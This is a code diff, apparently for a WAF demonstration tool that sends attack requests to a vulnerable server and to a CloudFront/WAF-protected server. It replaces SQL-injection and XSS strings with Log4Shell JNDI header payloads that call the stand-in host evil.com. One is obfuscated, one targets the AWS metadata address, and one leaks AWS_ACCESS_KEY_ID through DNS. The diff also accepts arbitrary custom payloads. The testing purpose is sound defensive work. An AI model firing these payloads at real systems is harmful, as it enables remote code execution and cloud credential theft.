@@ -15,15 +15,39 @@ const URL_MAP = {
   },
 };
 
-const STAGE_STEP_MS = 140;
+const STAGE_STEP_MS = 180;
 
-const PATTERN_ATTEMPTS = [
-  { label: 'SQLI OR 1=1', query: `' OR 1=1 --` },
-  { label: 'XSS Script Tag', query: `<script>alert(1)</script>` },
-  { label: 'XSS javascript URI', query: `javascript:alert(1)` },
-  { label: 'SQLI UNION SELECT', query: `UNION SELECT password FROM users` },
-  { label: 'XSS Img onerror', query: `<img src=x onerror=alert(1)>` },
-  { label: 'SQLI DROP TABLE', query: `DROP TABLE users;` },
+const RCE_ATTEMPTS = [
+  {
+    label: 'JNDI LDAP / User-Agent',
+    header: 'User-Agent',
+    payload: '${jndi:ldap://evil.com/a}',
+  },
+  {
+    label: 'JNDI RMI / User-Agent',
+    header: 'User-Agent',
+    payload: '${jndi:rmi://evil.com/payload}',
+  },
+  {
+    label: 'JNDI DNS / X-Forwarded-For',
+    header: 'X-Forwarded-For',
+    payload: '${jndi:dns://evil.com/x}',
+  },
+  {
+    label: 'JNDI 난독화 / Referer',
+    header: 'Referer',
+    payload: '${${::-j}${::-n}${::-d}${::-i}:rmi://evil.com/a}',
+  },
+  {
+    label: 'AWS Metadata / X-Api-Version',
+    header: 'X-Api-Version',
+    payload: '${jndi:ldap://169.254.169.254/latest}',
+  },
+  {
+    label: 'Env 탈취 / User-Agent',
+    header: 'User-Agent',
+    payload: '${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.evil.com/a}',
+  },
 ];
 
 type Env = 'vulnerable' | 'aws';
@@ -61,21 +85,23 @@ async function sendStageWithDelay(
   await sleep(STAGE_STEP_MS);
 }
 
-async function sendPatternRequest(baseUrl: string, query: string, attempt: number, label: string) {
+async function probeRce(
+  baseUrl: string,
+  headerName: string,
+  payload: string,
+  attempt: number,
+  label: string,
+) {
   const start = Date.now();
   try {
-    // 페이로드를 email 필드에 삽입 — db.query($1)로 전달되며 XSS는 에러 메시지에 반사됨
-    const res = await fetch(new URL('/api/auth/login', baseUrl), {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        email: query,
-        password: 'test',
-      }),
+    const res = await fetch(`${baseUrl}/api/health`, {
+      method: 'GET',
+      headers: { [headerName]: payload },
       signal: AbortSignal.timeout(8000),
     });
 
     const latency = Date.now() - start;
+    // CloudFront 오탐 방지: WAF 403 → CF custom_error_response → 200+HTML
     const effectiveStatus = res.status === 200 && !hasJsonContentType(res) ? 403 : res.status;
     const blocked = effectiveStatus === 403 || effectiveStatus === 429;
 
@@ -85,6 +111,8 @@ async function sendPatternRequest(baseUrl: string, query: string, attempt: numbe
       latency,
       blocked,
       label: blocked ? `${label} BLOCKED` : `${label} REACHED APP`,
+      headerName,
+      payload,
     };
   } catch {
     return {
@@ -93,7 +121,9 @@ async function sendPatternRequest(baseUrl: string, query: string, attempt: numbe
       latency: Date.now() - start,
       blocked: false,
       label: `${label} CONNECTION ERROR`,
-      error: 'connection_refused',
+      error: 'connection_refused' as const,
+      headerName,
+      payload,
     };
   }
 }
@@ -101,6 +131,9 @@ async function sendPatternRequest(baseUrl: string, query: string, attempt: numbe
 export async function GET(request: NextRequest) {
   const searchParams = new URL(request.url).searchParams;
   const mode = searchParams.get('mode') === 'auto' ? 'auto' : 'manual';
+  const customHeader = searchParams.get('header');
+  const customPayload = searchParams.get('payload');
+
   let vulnUrl = URL_MAP[mode].vulnerable;
   let awsUrl = URL_MAP[mode].aws;
 
@@ -112,6 +145,12 @@ export async function GET(request: NextRequest) {
 
   const VULNERABLE_URL = vulnUrl || 'http://localhost:3000';
   const AWS_URL = awsUrl;
+
+  // 커스텀 파라미터가 있으면 단일 테스트, 없으면 6개 프리셋 전체 실행
+  const attempts =
+    customHeader && customPayload
+      ? [{ label: 'CUSTOM JNDI', header: customHeader, payload: customPayload }]
+      : RCE_ATTEMPTS;
 
   const encoder = new TextEncoder();
   const { readable, writable } = new TransformStream();
@@ -139,73 +178,78 @@ export async function GET(request: NextRequest) {
     try {
       await send({ type: 'start' });
 
-      for (let i = 0; i < PATTERN_ATTEMPTS.length; i++) {
-        const attempt = i + 1;
-        const pattern = PATTERN_ATTEMPTS[i];
+      for (let i = 0; i < attempts.length; i++) {
+        const attemptNum = i + 1;
+        const target = attempts[i];
+
         const [vulnResult, awsResult] = await Promise.all([
-          sendPatternRequest(VULNERABLE_URL, pattern.query, attempt, pattern.label),
+          probeRce(VULNERABLE_URL, target.header, target.payload, attemptNum, target.label),
           AWS_URL
-            ? sendPatternRequest(AWS_URL, pattern.query, attempt, pattern.label)
+            ? probeRce(AWS_URL, target.header, target.payload, attemptNum, target.label)
             : Promise.resolve({
-                attempt,
+                attempt: attemptNum,
                 status: -1,
                 latency: 0,
                 blocked: false,
                 label: 'AWS URL NOT CONFIGURED',
+                headerName: target.header,
+                payload: target.payload,
               }),
         ]);
 
+        // 취약 환경 stage 이벤트
         await sendStageWithDelay(
           sendStage,
           'vulnerable',
-          attempt,
+          attemptNum,
           'attacker',
           'reached',
-          '악성 패턴 전송',
-          `${pattern.label} 패턴이 포함된 요청이 취약 환경으로 유입되었습니다.`,
+          'JNDI 페이로드 헤더 전송',
+          `${target.header}: ${target.payload} — 취약 환경으로 요청이 전송되었습니다.`,
           'critical',
         );
         await sendStageWithDelay(
           sendStage,
           'vulnerable',
-          attempt,
+          attemptNum,
           'ecs',
           vulnResult.status > 0 ? 'reached' : 'failed',
           vulnResult.status > 0 ? 'EC2 도달' : 'EC2 도달 실패',
-          `취약 환경은 ${pattern.label} 요청을 호스트 계층까지 전달합니다.`,
+          '취약 환경은 WAF가 없어 JNDI 헤더 요청이 원본 서버까지 전달됩니다.',
           vulnResult.status > 0 ? 'critical' : 'warning',
         );
         await sendStageWithDelay(
           sendStage,
           'vulnerable',
-          attempt,
+          attemptNum,
           'app',
           vulnResult.status > 0 ? 'passed' : 'failed',
-          vulnResult.status > 0 ? 'Service Logic 처리' : 'Service Logic 도달 실패',
+          vulnResult.status > 0 ? '애플리케이션 로그 기록' : '앱 도달 실패',
           vulnResult.status > 0
-            ? `${pattern.label} 요청이 애플리케이션 계층에서 직접 처리되었습니다.`
+            ? `JNDI 페이로드가 애플리케이션 로그에 기록됩니다. Log4j 취약 버전이라면 외부 서버로 콜백이 트리거됩니다.`
             : '요청이 애플리케이션에 도달하지 못했습니다.',
-          vulnResult.status > 0 ? 'warning' : 'warning',
+          vulnResult.status > 0 ? 'critical' : 'warning',
         );
 
+        // 보안 환경 stage 이벤트
         await sendStageWithDelay(
           sendStage,
           'aws',
-          attempt,
+          attemptNum,
           'attacker',
           'reached',
-          '악성 패턴 전송',
-          `${pattern.label} 패턴이 포함된 요청이 보안 환경으로도 유입되었습니다.`,
+          'JNDI 페이로드 헤더 전송',
+          `동일한 ${target.header} 페이로드가 보안 환경으로 전송되었습니다.`,
           'critical',
         );
         await sendStageWithDelay(
           sendStage,
           'aws',
-          attempt,
+          attemptNum,
           'cloudfront',
           'passed',
-          'CloudFront 전달',
-          '보안 환경은 요청을 엣지 계층에서 먼저 수신합니다.',
+          'CloudFront 경유',
+          '요청이 CloudFront 엣지를 통해 WAF 검사 단계로 전달됩니다.',
           'info',
         );
 
@@ -213,29 +257,29 @@ export async function GET(request: NextRequest) {
           await sendStageWithDelay(
             sendStage,
             'aws',
-            attempt,
+            attemptNum,
             'waf',
             'blocked',
-            'WAF 차단',
-            `${pattern.label} 요청이 WAF 규칙에 의해 차단되었습니다.`,
+            'WAF KnownBadInputs 차단',
+            `WAF KnownBadInputsRuleSet이 JNDI 패턴을 탐지해 차단했습니다. 페이로드가 애플리케이션에 전혀 도달하지 않습니다.`,
             'success',
           );
         } else {
           await sendStageWithDelay(
             sendStage,
             'aws',
-            attempt,
+            attemptNum,
             'waf',
             'passed',
             'WAF 통과',
-            `${pattern.label} 요청이 WAF를 통과했습니다.`,
+            '요청이 WAF를 통과했습니다.',
             'warning',
           );
           if (awsResult.status > 0) {
             await sendStageWithDelay(
               sendStage,
               'aws',
-              attempt,
+              attemptNum,
               'ecs',
               'reached',
               'EC2 도달',
@@ -245,18 +289,24 @@ export async function GET(request: NextRequest) {
             await sendStageWithDelay(
               sendStage,
               'aws',
-              attempt,
+              attemptNum,
               'app',
               'passed',
-              'Service Logic 처리',
-              '차단되지 않은 요청이 서비스 로직까지 전달되었습니다.',
+              '애플리케이션 처리',
+              '차단되지 않은 요청이 서비스 로직에 도달했습니다.',
               'warning',
             );
           }
         }
 
+        // rce_result: 카드 컴포넌트 전용 커스텀 이벤트
+        await send({ type: 'rce_result', env: 'vulnerable', ...vulnResult });
+        await send({ type: 'rce_result', env: 'aws', ...awsResult });
+
+        // result: 아키텍처 시각화 + 세션 저장 호환
         await send({ type: 'result', env: 'vulnerable', ...vulnResult });
         await send({ type: 'result', env: 'aws', ...awsResult });
+
         await sleep(240);
       }
 
